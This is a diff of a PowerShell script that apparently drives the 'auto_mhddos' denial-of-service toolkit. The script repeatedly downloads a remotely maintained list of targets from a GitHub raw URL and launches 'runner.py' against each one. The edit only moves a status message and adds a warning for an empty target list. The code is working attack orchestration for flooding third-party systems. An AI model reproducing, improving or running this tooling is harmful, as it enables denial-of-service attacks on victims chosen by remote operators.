@@ -28,13 +28,13 @@ while($true){
 
     # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
     $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
-    Write-Output $('Number of targets in list: ' + $targets.Length) 
 
     while ($targets.Length -eq 0) {
+        Write-Output 'Empty target list or some error happened. If this message repeats - contact author.' 
         Start-Sleep(5)
         $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
-        Write-Output $('Number of targets in list: ' + $targets.Length) 
     }
+    Write-Output $('Number of targets in list: ' + $targets.Length) 
     
     foreach ($target in $targets) { 
         $runner_args = $('runner.py ' + $target.Value + $p + $rpc + $debug + ' ' + $args)
